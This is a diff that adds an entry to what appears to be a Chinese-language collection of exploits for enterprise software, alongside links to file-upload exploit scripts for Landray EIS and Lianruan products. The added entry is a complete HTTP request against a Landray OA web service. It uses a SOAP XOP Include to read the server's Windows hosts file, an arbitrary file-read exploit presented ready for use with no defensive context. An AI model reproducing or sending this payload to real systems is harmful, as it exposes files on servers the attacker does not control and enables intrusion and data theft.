@@ -151,7 +151,17 @@
 
 [蓝凌EIS saveIm文件上传](https://github.com/MzzdToT/HAC_Bored_Writing/blob/main/Fileupload/%E8%93%9D%E5%87%8CEIS/EIS_upload.py)
 
+[蓝凌 OA 任意文件读取]
+POST /sys/webservice/thirdImSyncForKKWebService HTTP/1.1
+Host: xxxxxxxx
+Content-Type: multipart/related; boundary=----WebKitFormBoundaryDLB5KLNO7vBKABxG
+Content-Length: 585
 
+------WebKitFormBoundaryDLB5KLNO7vBKABxG
+Content-Disposition: form-data; name="111"
+
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.kk.im.third.kmss.landray.com/"><soapenv:Header/><soapenv:Body><web:getTodo><arg0><otherCond>1</otherCond><pageNo>1</pageNo><rowSize>1</rowSize><targets>1</targets><type><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///C:\Windows\System32\drivers\etc\hosts"/></type></arg0></web:getTodo></soapenv:Body></soapenv:Envelope>
+------WebKitFormBoundaryDLB5KLNO7vBKABxG--
 ## 联软准入系统
 
 [联软准入系统任意文件上传](https://www.hedysx.com/2627.html)
